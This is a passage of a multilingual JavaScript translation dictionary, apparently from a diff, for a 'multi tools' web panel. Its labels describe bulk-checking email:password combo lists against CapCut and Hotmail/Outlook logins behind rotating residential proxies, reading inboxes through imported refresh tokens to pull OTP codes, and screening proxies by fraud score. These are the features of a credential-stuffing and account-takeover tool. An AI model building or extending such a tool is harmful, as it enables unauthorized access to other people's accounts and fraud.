"Ejemplo:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Generar Todos los Códigos", "tfa_bulk_res_label": "RESULTADOS (FORMATO COMBO + CÓDIGO 2FA)", "tfa_bulk_res_ph": "Los códigos 2FA aparecerán aquí...", "tfa_alert_empty_single": "¡Por favor ingresa la clave secreta 2FA!", "tfa_alert_empty_bulk": "¡Por favor ingresa la lista de claves o combos!", "tfa_processing": "Procesando...", "prx_title": "Verificador de Proxy", "prx_desc": "Formatos: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, o <code>scheme://...</code>", "prx_input_label": "LISTA DE PROXIES", "prx_btn_sample": "Ejemplo", "prx_btn_clear": "Limpiar", "prx_input_ph": "Ejemplo:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "HILOS", "prx_timeout_label": "TIEMPO DE ESPERA (s)", "prx_scamalytics_toggle": "Verificación de Riesgo de Fraude Scamalytics", "prx_btn_start": "Iniciar Verificación", "prx_btn_stop": "Detener", "prx_stat_total": "TOTAL", "prx_stat_live": "VIVOS (LIVE)", "prx_stat_dead": "MUERTOS (DEAD)", "prx_stat_latency": "PING PROMEDIO", "prx_stat_clean": "BAJO FRAUDE (<25)", "prx_filter_all": "Todos", "prx_filter_live": "Vivos", "prx_filter_dead": "Muertos", "prx_filter_clean": "Bajo Fraude", "prx_search_ph": "Buscar IP / País...", "prx_btn_export": "Exportar", "prx_exp_live_raw": "Copiar Live (Formato Original)", "prx_exp_live_ipport": "Copiar Live (HOST:PORT)", "prx_exp_live_txt": "Descargar Live (.TXT)", "prx_exp_report_json": "Descargar Reporte Completo (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "ESTADO", "prx_th_ping": "PING", "prx_th_loc": "IP SALIDA Y UBICACIÓN", "prx_th_isp": "PROVEEDOR / ORG", "prx_th_fraud": "RIESGO FRAUDE", "prx_th_act": "DETALLES", "prx_empty_table": "No se han verificado proxies aún. Ingresa la lista y pulsa <b>Iniciar Verificación</b>.", "prx_no_match": "No hay proxies que coincidan con el filtro.", "prx_modal_title": "Detalles de Diagnóstico de Proxy", "prx_modal_close": "Cerrar", "prx_alert_empty": "¡Por favor ingresa la lista de proxies!", "prx_no_live_copy": "No hay proxies LIVE para copiar.", "prx_no_live_dl": "No hay proxies LIVE para descargar.", "nav_menu": "Menú"}, "pt": {"brand_sub": "MULTI FERRAMENTAS • PAINEL SOCIAL", "tab_mail": "Verificador de E-mail", "tab_capcut": "Verificador CapCut", "tab_2fa": "Gerador 2FA", "tab_proxy": "Verificador de Proxy", "tm_accounts_title": "Contas", "tm_clear_all_title": "Limpar Todas as Contas", "tm_search_acc_ph": "Buscar e-mail da conta...", "tm_upload_txt": "Upload .TXT", "tm_upload_txt_title": "Enviar Arquivo .TXT (Importação em Massa)", "tm_add_btn": "Adicionar", "tm_add_btn_title": "Adicionar Conta Manualmente", "tm_mode_search": "Modo: Buscar E-mail", "tm_mode_all": "Modo: Todas as Contas", "tm_show_all": "Mostrar Todas", "tm_search_only": "Apenas Busca", "tm_empty_acc_msg": "Nenhuma conta ainda.<br>Envie um arquivo <b>.TXT</b> ou clique em <b>Adicionar</b>.", "tm_inbox_title": "CAIXA DE ENTRADA", "tm_btn_accounts": "Contas", "tm_filter_msg_ph": "Filtrar remetente / assunto...", "tm_empty_inbox_select": "Selecione uma conta à esquerda para ver os e-mails.", "tm_active_email_placeholder": "Selecionar Conta", "tm_badge_standby": "● Em espera", "tm_badge_connected": "● Conectado", "tm_badge_disconnected": "● Desconectado", "tm_btn_copy": "Copiar", "tm_no_email_selected": "Nenhum e-mail selecionado", "tm_click_inbox_hint": "Clique em um e-mail na lista para ler seu conteúdo.", "tm_otp_detected": "CÓDIGO DE VERIFICAÇÃO / OTP DETECTADO", "tm_btn_copy_otp": "Copiar OTP", "tm_copied": "Copiado!", "tm_search_another_title": "Buscar Outra Conta", "tm_search_another_desc": "Digite o e-mail na busca acima para selecionar uma conta.", "tm_accounts_avail": "Contas Disponíveis", "tm_inbox_empty": "Caixa de entrada vazia.", "tm_no_msg_filter": "Nenhuma mensagem corresponde ao filtro.", "tm_no_acc_match": "Nenhuma conta encontrada", "tm_delete_acc_confirm": "Remover {email} da lista?", "tm_clear_all_confirm": "Limpar todas as contas do verificador?", "tm_extracting": "Extraindo e verificando contas...", "tm_modal_add_title": "Adicionar Contas Outlook / Hotmail", "tm_modal_upload_label": "ENVIAR ARQUIVO .TXT (Importação em Massa)", "tm_modal_paste_label": "OU COLAR TOKENS (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "PROXY (Opcional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Deixe em branco se for conexão direta", "tm_modal_btn_cancel": "Cancelar", "tm_modal_btn_import": "Importar e Verificar", "cc_card_title": "Entrada de Contas CapCut", "cc_acc_label": "LISTA DE CONTAS (email:pass, email|pass, etc)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL PROXY RESIDENCIAL (Obrigatório)", "cc_proxy_help": "Use <code>{sess}</code> para rotação automática de IP.", "cc_threads_label": "THREADS", "cc_retries_label": "TENTATIVAS IP", "cc_btn_start": "Iniciar Checagem CapCut", "cc_btn_stop": "Parar", "cc_results_title": "Resultados de Checagem CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Contas PRO aparecerão aqui...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "Contas FREE aparecerão aqui...", "cc_dead_title": "DEAD / ERRO", "cc_dead_ph": "Contas com erro aparecerão aqui...", "cc_btn_copy": "Copiar", "cc_btn_save": "Salvar", "cc_alert_empty": "Por favor, insira a lista de contas CapCut!", "cc_alert_no_valid": "Nenhuma conta válida encontrada!", "tfa_single_title": "Código 2FA Rápido (Individual)", "tfa_single_desc": "Insira a chave secreta 2FA (Base32) para gerar códigos de verificação de 6 dígitos instantaneamente.", "tfa_single_label": "CHAVE SECRETA 2FA", "tfa_single_ph": "Exemplo: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Obter Código", "tfa_auth_code_label": "CÓDIGO DE AUTENTICAÇÃO", "tfa_btn_copy_code": "Copiar Código", "tfa_bulk_title": "Gerador 2FA em Massa", "tfa_bulk_desc": "Suporta colar várias chaves ou linhas combo (formato <code>email|pass|secret</code>).", "tfa_bulk_label": "LISTA DE CHAVES / COMBOS", "tfa_bulk_ph": "Exemplo:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Gerar Todos os Códigos", "tfa_bulk_res_label": "RESULTADOS (FORMATO COMBO + CÓDIGO 2FA)", "tfa_bulk_res_ph": "Os códigos 2FA gerados aparecerão aqui...", "tfa_alert_empty_single": "Por favor, insira a chave secreta 2FA!", "tfa_alert_empty_bulk": "Por favor, insira a lista de chaves ou combos!", "tfa_processing": "Processando...", "prx_title": "Verificador de Proxy", "prx_desc": "Formatos: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, ou <code>scheme://...</code>", "prx_input_label": "LISTA DE PROXIES", "prx_btn_sample": "Exemplo", "prx_btn_clear": "Limpar", "prx_input_ph": "Exemplo:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "THREADS", "prx_timeout_label": "TIMEOUT (s)", "prx_scamalytics_toggle": "Verificação de Score de Fraude Scamalytics", "prx_btn_start": "Iniciar Checagem", "prx_btn_stop": "Parar", "prx_stat_total": "TOTAL", "prx_stat_live": "VIVOS (LIVE)", "prx_stat_dead": "MORTOS (DEAD)", "prx_stat_latency": "PING MÉDIO", "prx_stat_clean": "BAIXO RISCO (<25)", "prx_filter_all": "Todos", "prx_filter_live": "Vivos", "prx_filter_dead": "Mortos", "prx_filter_clean": "Baixo Risco", "prx_search_ph": "Buscar IP / País...", "prx_btn_export": "Exportar", "prx_exp_live_raw": "Copiar Live (Formato Original)", "prx_exp_live_ipport": "Copiar Live (HOST:PORT)", "prx_exp_live_txt": "Baixar Live (.TXT)", "prx_exp_report_json": "Baixar Relatório Completo (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "STATUS", "prx_th_ping": "PING", "prx_th_loc": "IP DE SAÍDA E LOCALIZAÇÃO", "prx_th_isp": "PROVEDOR / ORG", "prx_th_fraud": "RISCO DE FRAUDE", "prx_th_act": "DETALHES", "prx_empty_table": "Nenhum proxy verificado ainda. Insira a lista e clique em <b>Iniciar Checagem</b>.", "prx_no_match": "Nenhum proxy corresponde ao filtro.", "prx_modal_title": "Detalhes de Diagnóstico do Proxy", "prx_modal_close": "Fechar", "prx_alert_empty": "Por favor, insira a lista de proxies!", "prx_no_live_copy": "Nenhum proxy LIVE para copiar.", "prx_no_live_dl": "Nenhum proxy LIVE para baixar.", "nav_menu": "Menu"}};
+    const I18N_DICTS = {"id": {"brand_sub": "MULTI TOOLS • LAYANAN SOSMED", "tab_mail": "Mail Reader", "tab_capcut": "CapCut Checker", "tab_2fa": "2FA Generator", "tab_proxy": "Proxy Checker", "tm_accounts_title": "Accounts", "tm_clear_all_title": "Hapus Semua Akun", "tm_search_acc_ph": "Cari email akun...", "tm_upload_txt": "Upload .TXT", "tm_upload_txt_title": "Upload File .TXT (Bulk Auto-read)", "tm_add_btn": "Add", "tm_add_btn_title": "Tambah Akun Manual", "tm_mode_search": "Mode: Cari Email", "tm_mode_all": "Mode: Semua Akun", "tm_show_all": "Tampilkan Semua", "tm_search_only": "Mode Cari Saja", "tm_empty_acc_msg": "Belum ada akun.<br>Upload file <b>.TXT</b> atau klik <b>Add</b>.", "tm_inbox_title": "INBOX", "tm_btn_accounts": "Akun", "tm_filter_msg_ph": "Filter pengirim / subjek...", "tm_empty_inbox_select": "Pilih akun di sebelah kiri untuk melihat pesan inbox.", "tm_active_email_placeholder": "Pilih Akun", "tm_badge_standby": "● Standby", "tm_badge_connected": "● Connected", "tm_badge_disconnected": "● Disconnected", "tm_btn_copy": "Copy", "tm_no_email_selected": "Belum ada email yang dipilih", "tm_click_inbox_hint": "Klik salah satu email dari daftar inbox untuk membaca isi surat.", "tm_otp_detected": "KODE VERIFIKASI / OTP TERDETEKSI", "tm_btn_copy_otp": "Salin OTP", "tm_copied": "Disalin!", "tm_search_another_title": "Cari Akun Lain", "tm_search_another_desc": "Ketik email di kolom pencarian di atas untuk memilih akun.", "tm_accounts_avail": "Akun Tersedia", "tm_inbox_empty": "Inbox kosong.", "tm_no_msg_filter": "Tidak ada pesan yang cocok dengan filter.", "tm_no_acc_match": "Tidak ada akun yang cocok dengan", "tm_delete_acc_confirm": "Hapus {email} dari daftar?", "tm_clear_all_confirm": "Hapus semua daftar akun Mail Checker?", "tm_extracting": "Mengekstrak & memeriksa akun...", "tm_modal_add_title": "Add Outlook / Hotmail Accounts", "tm_modal_upload_label": "UPLOAD FILE .TXT (Bulk Import)", "tm_modal_paste_label": "ATAU PASTE TOKENS (email|pass|refresh_token|client_id atau token saja)", "tm_modal_proxy_label": "PROXY (Opsional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Kosongkan jika direct", "tm_modal_btn_cancel": "Batal", "tm_modal_btn_import": "Import & Check", "cc_card_title": "Input Akun CapCut", "cc_acc_label": "DAFTAR AKUN (email:pass, email|pass, dll)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "RESIDENTIAL PROXY URL (Wajib)", "cc_proxy_help": "Gunakan token <code>{sess}</code> untuk rotasi IP otomatis.", "cc_threads_label": "THREADS", "cc_retries_label": "IP RETRIES", "cc_btn_start": "Mulai Check CapCut", "cc_btn_stop": "Stop", "cc_results_title": "Hasil Pengecekan CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Akun PRO akan muncul di sini...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "Akun FREE akan muncul di sini...", "cc_dead_title": "DEAD / ERROR", "cc_dead_ph": "Akun Gagal akan muncul di sini...", "cc_btn_copy": "Copy", "cc_btn_save": "Save", "cc_alert_empty": "Silakan masukkan daftar akun CapCut!", "cc_alert_no_valid": "Tidak ada akun valid yang ditemukan!", "tfa_single_title": "Quick 2FA Code (Single)", "tfa_single_desc": "Masukkan 2FA Secret Key (Base32) untuk mendapatkan kode verifikasi 6 digit instan.", "tfa_single_label": "2FA SECRET KEY", "tfa_single_ph": "Contoh: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Get Code", "tfa_auth_code_label": "AUTHENTICATOR CODE", "tfa_btn_copy_code": "Salin Kode", "tfa_bulk_title": "Bulk 2FA Generator", "tfa_bulk_desc": "Mendukung paste banyak Secret Key atau baris combo (format <code>email|pass|secret</code> atau secret per baris).", "tfa_bulk_label": "INPUT LIST SECRETS / COMBOS", "tfa_bulk_ph": "Contoh format:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...\\nHXDMVJZTGNCDESRR...", "tfa_btn_gen_all": "Generate All Codes", "tfa_bulk_res_label": "HASIL (FORMAT COMBO + 2FA CODE)", "tfa_bulk_res_ph": "Hasil kode 2FA akan muncul di sini...", "tfa_alert_empty_single": "Silakan masukkan 2FA Secret Key!", "tfa_alert_empty_bulk": "Silakan masukkan list secret / combo!", "tfa_processing": "Memproses...", "prx_title": "Proxy Checker", "prx_desc": "Dukungan format: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, atau <code>scheme://...</code>", "prx_input_label": "INPUT PROXY LIST", "prx_btn_sample": "Sample", "prx_btn_clear": "Clear", "prx_input_ph": "Contoh format:\\n192.168.1.1:8080\\n192.168.1.1:8080:username:password\\nusername:password:192.168.1.1:8080\\nhttp://user:pass@192.168.1.1:8080", "prx_threads_label": "THREADS", "prx_timeout_label": "TIMEOUT (s)", "prx_scamalytics_toggle": "Scamalytics Fraud Score Check", "prx_btn_start": "Start Checking", "prx_btn_stop": "Stop", "prx_stat_total": "TOTAL", "prx_stat_live": "LIVE", "prx_stat_dead": "DEAD", "prx_stat_latency": "AVG LATENCY", "prx_stat_clean": "LOW FRAUD (<25)", "prx_filter_all": "All", "prx_filter_live": "Live", "prx_filter_dead": "Dead", "prx_filter_clean": "Low Fraud", "prx_search_ph": "Cari IP / Negara...", "prx_btn_export": "Export", "prx_exp_live_raw": "Copy Live (Original Format)", "prx_exp_live_ipport": "Copy Live (HOST:PORT)", "prx_exp_live_txt": "Download Live (.TXT)", "prx_exp_report_json": "Download Full Report (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "STATUS", "prx_th_ping": "PING", "prx_th_loc": "EXIT IP & LOCATION", "prx_th_isp": "ISP / ORG", "prx_th_fraud": "FRAUD RISK", "prx_th_act": "ACT", "prx_empty_table": "Belum ada proxy yang diperiksa. Masukkan list proxy dan klik <b>Start Checking</b>.", "prx_no_match": "Tidak ada proxy yang cocok dengan filter atau pencarian.", "prx_modal_title": "Proxy Diagnostic Details", "prx_modal_close": "Tutup", "prx_alert_empty": "Silakan masukkan list proxy!", "prx_no_live_copy": "Tidak ada proxy LIVE untuk disalin.", "prx_no_live_dl": "Tidak ada proxy LIVE untuk diunduh.", "nav_menu": "Menu", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Cek validitas login akun Microsoft (Hotmail / Outlook / Live) format email:password atau email|password & deteksi Negara/Lokasi.", "hm_acc_label": "DAFTAR AKUN (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Gunakan Proxy (Disarankan)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Mulai Check Hotmail", "hm_btn_stop": "Stop", "hm_results_title": "Hasil Pengecekan Hotmail", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "Akun LIVE (berhasil login + negara) akan muncul di sini...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "Akun DIE (salah password / tidak ada) akan muncul di sini...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Silakan masukkan list akun Hotmail/Outlook!", "hm_alert_no_valid": "Tidak ada baris akun format email:pass yang valid."}, "en": {"brand_sub": "MULTI TOOLS • SOCIAL MEDIA SUITE", "tab_mail": "Mail Reader", "tab_capcut": "CapCut Checker", "tab_2fa": "2FA Generator", "tab_proxy": "Proxy Checker", "tm_accounts_title": "Accounts", "tm_clear_all_title": "Clear All Accounts", "tm_search_acc_ph": "Search account email...", "tm_upload_txt": "Upload .TXT", "tm_upload_txt_title": "Upload .TXT File (Bulk Auto-read)", "tm_add_btn": "Add", "tm_add_btn_title": "Add Account Manually", "tm_mode_search": "Mode: Search Email", "tm_mode_all": "Mode: All Accounts", "tm_show_all": "Show All", "tm_search_only": "Search Only Mode", "tm_empty_acc_msg": "No accounts yet.<br>Upload a <b>.TXT</b> file or click <b>Add</b>.", "tm_inbox_title": "INBOX", "tm_btn_accounts": "Accounts", "tm_filter_msg_ph": "Filter sender / subject...", "tm_empty_inbox_select": "Select an account on the left to view inbox messages.", "tm_active_email_placeholder": "Select Account", "tm_badge_standby": "● Standby", "tm_badge_connected": "● Connected", "tm_badge_disconnected": "● Disconnected", "tm_btn_copy": "Copy", "tm_no_email_selected": "No email selected", "tm_click_inbox_hint": "Click an email from the inbox list to read its contents.", "tm_otp_detected": "VERIFICATION CODE / OTP DETECTED", "tm_btn_copy_otp": "Copy OTP", "tm_copied": "Copied!", "tm_search_another_title": "Search Another Account", "tm_search_another_desc": "Type an email in the search box above to pick an account.", "tm_accounts_avail": "Accounts Available", "tm_inbox_empty": "Inbox is empty.", "tm_no_msg_filter": "No messages match your filter.", "tm_no_acc_match": "No accounts matching", "tm_delete_acc_confirm": "Delete {email} from list?", "tm_clear_all_confirm": "Clear all Mail Checker accounts?", "tm_extracting": "Extracting & verifying accounts...", "tm_modal_add_title": "Add Outlook / Hotmail Accounts", "tm_modal_upload_label": "UPLOAD .TXT FILE (Bulk Import)", "tm_modal_paste_label": "OR PASTE TOKENS (email|pass|refresh_token|client_id or token only)", "tm_modal_proxy_label": "PROXY (Optional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Leave blank if direct connection", "tm_modal_btn_cancel": "Cancel", "tm_modal_btn_import": "Import & Check", "cc_card_title": "CapCut Account Input", "cc_acc_label": "ACCOUNT LIST (email:pass, email|pass, etc)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "RESIDENTIAL PROXY URL (Required)", "cc_proxy_help": "Use token <code>{sess}</code> for automatic IP rotation.", "cc_threads_label": "THREADS", "cc_retries_label": "IP RETRIES", "cc_btn_start": "Start CapCut Check", "cc_btn_stop": "Stop", "cc_results_title": "CapCut Check Results", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "PRO accounts will appear here...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "FREE accounts will appear here...", "cc_dead_title": "DEAD / ERROR", "cc_dead_ph": "Failed accounts will appear here...", "cc_btn_copy": "Copy", "cc_btn_save": "Save", "cc_alert_empty": "Please enter CapCut account list!", "cc_alert_no_valid": "No valid accounts found!", "tfa_single_title": "Quick 2FA Code (Single)", "tfa_single_desc": "Enter a 2FA Secret Key (Base32) to generate instant 6-digit verification codes.", "tfa_single_label": "2FA SECRET KEY", "tfa_single_ph": "Example: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Get Code", "tfa_auth_code_label": "AUTHENTICATOR CODE", "tfa_btn_copy_code": "Copy Code", "tfa_bulk_title": "Bulk 2FA Generator", "tfa_bulk_desc": "Supports pasting multiple Secret Keys or combo lines (format <code>email|pass|secret</code> or secret per line).", "tfa_bulk_label": "INPUT LIST SECRETS / COMBOS", "tfa_bulk_ph": "Example format:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...\\nHXDMVJZTGNCDESRR...", "tfa_btn_gen_all": "Generate All Codes", "tfa_bulk_res_label": "RESULTS (COMBO + 2FA CODE FORMAT)", "tfa_bulk_res_ph": "Generated 2FA codes will appear here...", "tfa_alert_empty_single": "Please enter a 2FA Secret Key!", "tfa_alert_empty_bulk": "Please enter secret list or combo lines!", "tfa_processing": "Processing...", "prx_title": "Proxy Checker", "prx_desc": "Supported formats: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, or <code>scheme://...</code>", "prx_input_label": "INPUT PROXY LIST", "prx_btn_sample": "Sample", "prx_btn_clear": "Clear", "prx_input_ph": "Example format:\\n192.168.1.1:8080\\n192.168.1.1:8080:username:password\\nusername:password:192.168.1.1:8080\\nhttp://user:pass@192.168.1.1:8080", "prx_threads_label": "THREADS", "prx_timeout_label": "TIMEOUT (s)", "prx_scamalytics_toggle": "Scamalytics Fraud Score Check", "prx_btn_start": "Start Checking", "prx_btn_stop": "Stop", "prx_stat_total": "TOTAL", "prx_stat_live": "LIVE", "prx_stat_dead": "DEAD", "prx_stat_latency": "AVG LATENCY", "prx_stat_clean": "LOW FRAUD (<25)", "prx_filter_all": "All", "prx_filter_live": "Live", "prx_filter_dead": "Dead", "prx_filter_clean": "Low Fraud", "prx_search_ph": "Search IP / Country...", "prx_btn_export": "Export", "prx_exp_live_raw": "Copy Live (Original Format)", "prx_exp_live_ipport": "Copy Live (HOST:PORT)", "prx_exp_live_txt": "Download Live (.TXT)", "prx_exp_report_json": "Download Full Report (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "STATUS", "prx_th_ping": "PING", "prx_th_loc": "EXIT IP & LOCATION", "prx_th_isp": "ISP / ORG", "prx_th_fraud": "FRAUD RISK", "prx_th_act": "ACT", "prx_empty_table": "No proxies checked yet. Enter proxy list and click <b>Start Checking</b>.", "prx_no_match": "No proxies match your search or filter.", "prx_modal_title": "Proxy Diagnostic Details", "prx_modal_close": "Close", "prx_alert_empty": "Please enter a proxy list!", "prx_no_live_copy": "No LIVE proxies to copy.", "prx_no_live_dl": "No LIVE proxies to download.", "nav_menu": "Menu", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}, "vi": {"brand_sub": "ĐA CÔNG CỤ • DỊCH VỤ MẠNG XÃ HỘI", "tab_mail": "Kiểm Tra Mail", "tab_capcut": "Kiểm Tra CapCut", "tab_2fa": "Tạo Mã 2FA", "tab_proxy": "Kiểm Tra Proxy", "tm_accounts_title": "Tài Khoản", "tm_clear_all_title": "Xóa Tất Cả Tài Khoản", "tm_search_acc_ph": "Tìm kiếm email tài khoản...", "tm_upload_txt": "Tải Lên .TXT", "tm_upload_txt_title": "Tải Tệp .TXT (Nhập Tự Động Hàng Loạt)", "tm_add_btn": "Thêm", "tm_add_btn_title": "Thêm Tài Khoản Thủ Công", "tm_mode_search": "Chế độ: Tìm Email", "tm_mode_all": "Chế độ: Tất Cả", "tm_show_all": "Hiện Tất Cả", "tm_search_only": "Chỉ Tìm Kiếm", "tm_empty_acc_msg": "Chưa có tài khoản.<br>Tải lên tệp <b>.TXT</b> hoặc bấm <b>Thêm</b>.", "tm_inbox_title": "HỘP THƯ ĐẾN", "tm_btn_accounts": "Tài Khoản", "tm_filter_msg_ph": "Lọc người gửi / tiêu đề...", "tm_empty_inbox_select": "Chọn một tài khoản ở bên trái để xem tin nhắn.", "tm_active_email_placeholder": "Chọn Tài Khoản", "tm_badge_standby": "● Chờ", "tm_badge_connected": "● Đã Kết Nối", "tm_badge_disconnected": "● Ngắt Kết Nối", "tm_btn_copy": "Sao Chép", "tm_no_email_selected": "Chưa chọn thư nào", "tm_click_inbox_hint": "Bấm vào một thư trong danh sách để đọc nội dung.", "tm_otp_detected": "PHÁT HIỆN MÃ XÁC THỰC / OTP", "tm_btn_copy_otp": "Sao Chép OTP", "tm_copied": "Đã sao chép!", "tm_search_another_title": "Tìm Tài Khoản Khác", "tm_search_another_desc": "Gõ email vào ô tìm kiếm phía trên để chọn tài khoản.", "tm_accounts_avail": "Tài Khoản Khả Dụng", "tm_inbox_empty": "Hộp thư rỗng.", "tm_no_msg_filter": "Không có thư nào khớp bộ lọc.", "tm_no_acc_match": "Không tìm thấy tài khoản", "tm_delete_acc_confirm": "Xóa {email} khỏi danh sách?", "tm_clear_all_confirm": "Xóa toàn bộ tài khoản Mail Checker?", "tm_extracting": "Đang trích xuất & kiểm tra...", "tm_modal_add_title": "Thêm Tài Khoản Outlook / Hotmail", "tm_modal_upload_label": "TẢI TỆP .TXT (Nhập Hàng Loạt)", "tm_modal_paste_label": "HOẶC DÁN TOKEN (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "PROXY (Tùy chọn: http://user:pass@host:port)", "tm_modal_proxy_ph": "Để trống nếu kết nối trực tiếp", "tm_modal_btn_cancel": "Hủy", "tm_modal_btn_import": "Nhập & Kiểm Tra", "cc_card_title": "Nhập Tài Khoản CapCut", "cc_acc_label": "DANH SÁCH (email:pass, email|pass,...)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL PROXY RESIDENTIAL (Bắt buộc)", "cc_proxy_help": "Dùng <code>{sess}</code> để tự động xoay IP.", "cc_threads_label": "LUỒNG", "cc_retries_label": "THỬ LẠI IP", "cc_btn_start": "Bắt Đầu Check CapCut", "cc_btn_stop": "Dừng", "cc_results_title": "Kết Quả Check CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Tài khoản PRO sẽ hiển thị ở đây...", "cc_free_title": "FREE / THƯỜNG", "cc_free_ph": "Tài khoản FREE sẽ hiển thị ở đây...", "cc_dead_title": "DEAD / LỖI", "cc_dead_ph": "Tài khoản lỗi sẽ hiển thị ở đây...", "cc_btn_copy": "Sao Chép", "cc_btn_save": "Lưu", "cc_alert_empty": "Vui lòng nhập danh sách tài khoản CapCut!", "cc_alert_no_valid": "Không tìm thấy tài khoản hợp lệ!", "tfa_single_title": "Mã 2FA Nhanh (Đơn)", "tfa_single_desc": "Nhập 2FA Secret Key (Base32) để nhận mã xác minh 6 số tức thì.", "tfa_single_label": "2FA SECRET KEY", "tfa_single_ph": "Ví dụ: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Lấy Mã", "tfa_auth_code_label": "MÃ XÁC THỰC", "tfa_btn_copy_code": "Sao Chép Mã", "tfa_bulk_title": "Tạo 2FA Hàng Loạt", "tfa_bulk_desc": "Hỗ trợ dán nhiều Secret Key hoặc dòng combo (định dạng <code>email|pass|secret</code> hoặc secret mỗi dòng).", "tfa_bulk_label": "NHẬP DANH SÁCH SECRETS / COMBOS", "tfa_bulk_ph": "Ví dụ:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Tạo Tất Cả Mã", "tfa_bulk_res_label": "KẾT QUẢ (COMBO + MÃ 2FA)", "tfa_bulk_res_ph": "Mã 2FA sẽ xuất hiện tại đây...", "tfa_alert_empty_single": "Vui lòng nhập Secret Key 2FA!", "tfa_alert_empty_bulk": "Vui lòng nhập danh sách secret/combo!", "tfa_processing": "Đang xử lý...", "prx_title": "Kiểm Tra Proxy", "prx_desc": "Hỗ trợ: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, hoặc <code>scheme://...</code>", "prx_input_label": "DANH SÁCH PROXY", "prx_btn_sample": "Mẫu", "prx_btn_clear": "Xóa", "prx_input_ph": "Ví dụ:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "LUỒNG", "prx_timeout_label": "THỜI GIAN CHỜ (s)", "prx_scamalytics_toggle": "Kiểm Tra Điểm Gian Lận Scamalytics", "prx_btn_start": "Bắt Đầu Kiểm Tra", "prx_btn_stop": "Dừng", "prx_stat_total": "TỔNG SỐ", "prx_stat_live": "SỐNG (LIVE)", "prx_stat_dead": "CHẾT (DEAD)", "prx_stat_latency": "ĐỘ TRỄ TB", "prx_stat_clean": "RỦI RO THẤP (<25)", "prx_filter_all": "Tất Cả", "prx_filter_live": "Sống", "prx_filter_dead": "Chết", "prx_filter_clean": "Sạch (Low Fraud)", "prx_search_ph": "Tìm IP / Quốc gia...", "prx_btn_export": "Xuất Dữ Liệu", "prx_exp_live_raw": "Sao Chép Live (Định Dạng Gốc)", "prx_exp_live_ipport": "Sao Chép Live (HOST:PORT)", "prx_exp_live_txt": "Tải Xuống Live (.TXT)", "prx_exp_report_json": "Tải Báo Cáo Đầy Đủ (.JSON)", "prx_th_proxy": 